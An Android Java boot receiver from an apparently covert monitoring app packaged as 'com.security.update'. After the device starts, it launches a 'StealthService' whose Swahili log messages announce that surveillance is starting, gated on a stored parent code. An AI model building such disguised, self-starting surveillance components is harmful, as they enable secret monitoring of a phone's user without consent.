package com.security.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Log.d(TAG, "📱 Device imewashwa - kuanzisha surveillance...");
            
            SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
            String parentCode = prefs.getString("parent_code", "");
            boolean isVerified = prefs.getBoolean("code_verified", false);
            
            // ONLY start if we have verified parent code
            if (!parentCode.isEmpty() && isVerified) {
                Intent serviceIntent = new Intent(context, StealthService.class);
                serviceIntent.putExtra("PARENT_CODE", parentCode);
                context.startService(serviceIntent);
                Log.d(TAG, "✅ StealthService imeshtakiwa baada ya boot");
            } else {
                Log.d(TAG, "❌ Hakuna parent code iliyothibitishwa - haijaanzishwa");
            }
        }
    }
}
